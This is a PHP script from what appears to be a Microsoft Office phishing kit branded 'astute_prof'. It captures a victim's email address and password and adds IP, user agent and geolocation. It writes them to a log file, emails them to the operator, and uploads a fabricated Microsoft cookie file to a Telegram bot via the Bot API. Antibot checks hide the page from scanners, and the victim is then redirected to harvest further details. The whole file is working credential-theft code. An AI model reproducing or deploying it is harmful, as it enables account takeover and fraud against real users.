<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Astute/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['emailPassword']
    )) {
        if (!$comps->checkEmpty(
            $_POST['emailPassword']
        )) {
            $content = '
                <meta name="viewport" content="width=device-width, initial-scale=1.0">

                <style>
        
                    * {
                        font-family: Arial;
                        font-weight: normal;
                        color: ##00674a;
                        margin: 0;
                        padding: 0;
                    }

                    .text-center {
                        text-align: center;
                    }
        
                    .small {
                        font-size: .8rem;
                    }
        
                    .mt-05 {
                        margin-top: .5rem;
                    }
        
                    .mt-1 {
                        margin-top: 1rem;
                    }
        
                    .mt-2, .my-2 {
                        margin-top: 2rem;
                    }
        
                    .my-3 {
                        margin: 3rem 0;
                    }
        
                    .mb-2, .my-2 {
                        margin-bottom: 2rem;
                    }
        
                    .text-light {
                        color: #8c8c8c;
                    }

                    .text-citizens {
                        color: ##00674a;
                    }
        
                    .container {
                        padding-left: 1.5rem;
                        padding-right: 1.5rem;
                    }
        
                    hr {
                        border: none;
                        margin-top: 1rem;
                        margin-bottom: 1rem;
                        height: 1px;
                        background-color: #8c8c8c;
                    }
        
                </style>

                <div class="text-center my-2">
                    <h4 class="text-light">astute_prof <span class="text-citizens">OFFICE</span></h4>
                    <h2>(1) Email Access </h2>
                </div>
                
                <div class="container">
                    <div class="mt-2">
                        <div>
                            <h3 class="text-light"> Email Access</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Email Address: ' . $_SESSION['email'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Password: ' . $_POST['emailPassword'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Domain: ' . substr($_SESSION['email'], strpos($_SESSION['email'], '@') + 1) . '</h3>
                        </div>
                       
                    <div class="my-3 text-center">
                        <span class="small text-light">Private page made by <a href="https://t.me/astute_prof" target="_blank">astute_prof</a>.</span>
                    </div>
                </div>
            ';
             $ipi = getenv("REMOTE_ADDR");
$useriagent = $_SERVER['HTTP_USER_AGENT'];
include 'algo.php';
$telcontent = <<<EOT
»»————- †[  ✔️office by Astute 4 magpie✔️ ]† ————-««
[E-Mail ID]           : {$_SESSION['email']}
[E-Mail Pass]         : {$_POST['emailPassword']}
»»————- †[ 🤖DEVICE INFO 🤖]† ————-««
Region		    : $regioncity
City		    : $citykota
Continent		: $continent
Timezone		: $timezone
IP		: $ipi
Agent   : $useriagent

»»————- †[ 🤖contact telegram @astute_prof 🤖]† ————-««
\r\n\r\n
EOT;
// Define the filename and path for the text file
$filename = 'log.txt';
$file_path = __DIR__ . '/' . $filename;

// Open the text file for writing
$file = fopen($file_path, 'a');

// Write the form data to the text file
fwrite($file, "$telcontent \n");
fwrite($file, "----------------------------------\n");

// Close the text file
fclose($file);
// Function to generate a random cookie value
function generateRandomCookieValue() {
    return bin2hex(random_bytes(16));
}

// Generate cookie values
$AjaxSessionKey = generateRandomCookieValue();
$MSFPC = generateRandomCookieValue();
$MicrosoftApplicationsTelemetryDeviceId = generateRandomCookieValue();
$OhpAuth = generateRandomCookieValue();
$OhpToken = generateRandomCookieValue();
$PersonalizationCookie = generateRandomCookieValue();
$UserIndex = generateRandomCookieValue();
$userid = generateRandomCookieValue();
$Imported_MUID = generateRandomCookieValue();
$MC1 = generateRandomCookieValue();
$MUID = generateRandomCookieValue();
$_clck = generateRandomCookieValue();
$_fbp = generateRandomCookieValue();
$_uetvid = generateRandomCookieValue();
$at_check = generateRandomCookieValue();
$fptctx2 = generateRandomCookieValue();
$mbox = generateRandomCookieValue();
$path = "/"; 
// Set the expiration time to 30 days from the current time
$expirationTime = time() + (30 * 24 * 60 * 60);

// Save cookies in a JSON file
$cookies = [
    'AjaxSessionKey' => [
        'value' => $AjaxSessionKey,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft365.com',
    ],
    'MSFPC' => [
        'value' => $MSFPC,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft365.com',
    ],
    'MicrosoftApplicationsTelemetryDeviceId' => [
        'value' => $MicrosoftApplicationsTelemetryDeviceId,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft365.com',
    ],
    'OhpAuth' => [
        'value' => $OhpAuth,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft365.com',
    ],
    'OhpToken' => [
        'value' => $OhpToken,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft365.com',
    ],
    'PersonalizationCookie' => [
        'value' => $PersonalizationCookie,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft365.com',
    ],
    'UserIndex' => [
        'value' => $UserIndex,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft365.com',
    ],
    'userid' => [
        'value' => $userid,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft365.com',
    ],
    'Imported_MUID' => [
        'value' => $Imported_MUID,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft.com',
    ],
    'MC1' => [
        'value' => $MC1,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft.com',
    ],
    'MUID' => [
        'value' => $MUID,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft.com',
    ],
    '_clck' => [
        'value' => $_clck,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft.com',
    ],
    '_fbp' => [
        'value' => $_fbp,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft.com',
    ],
    '_uetvid' => [
        'value' => $_uetvid,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft.com',
    ],
    'at_check' => [
        'value' => $at_check,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft.com',
    ],
    'fptctx2' => [
        'value' => $fptctx2,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft.com',
    ],
    'mbox' => [
        'value' => $mbox,
        'expires' => $expirationTime,
        'path' => $path,
        'domain' => '.microsoft.com',
    ],
];

// Specify the file name with its extension
$file = 'cookies.json';

// Save cookies to a JSON file
file_put_contents($file, json_encode($cookies, JSON_PRETTY_PRINT));

// Send the file to Telegram
require_once '../../cook.php';


// Set the request parameters to send a file
$request_params = array(
    'chat_id' => $tele_chat_id,
    'document' => new CURLFile(realpath($file)),
);

// Send the file using Telegram Bot API
$request_url = 'https://api.telegram.org/bot' . $tele_token . '/sendDocument';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $request_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $request_params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
if (isset($settings['telegram']) && $settings['telegram'] == "on"){
    if(isset($_SESSION['telegram']) || !$_SESSION['telegram']){
        $_SESSION['telegram'] = 1;
        if($comps->telegram($telcontent)){
            
        }
        //die($comps->headerX("../../Login/"));
    } 
}

            if ($comps->mailX("(1) Email Access | OfficeB3NK", $content)) {
                $comps->log(
                    "../../Astute/Audio/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Email Access\n\n"
                );
                die($comps->headerX("../../Login/details.php"));
            } else {
                die($antibot->throw404());
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Astute/Audio/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Astute/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }
    ?>
</body>
<html>